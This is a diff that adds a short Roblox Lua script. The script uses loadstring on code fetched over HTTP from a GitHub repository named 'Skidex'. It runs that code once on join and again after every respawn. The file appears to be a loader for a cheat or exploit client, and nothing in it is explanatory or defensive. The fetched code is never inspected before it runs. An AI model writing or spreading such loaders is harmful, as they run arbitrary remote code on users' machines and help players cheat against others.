@@ -1,0 +1,15 @@
+-- Get the local player
+local Player = game:GetService("Players").LocalPlayer
+
+-- Define the script content as a function
+local function ExecuteScript()
+    -- Your original script line
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/pulsar-client/Skidex/refs/heads/main/Components/Core",true))()
+end
+
+-- Connect the function to the CharacterAdded event
+-- This ensures the script runs when the player joins and after every death/respawn
+Player.CharacterAdded:Connect(ExecuteScript)
+
+-- Also execute it once immediately for when the player first joins or is already spawned
+ExecuteScript()
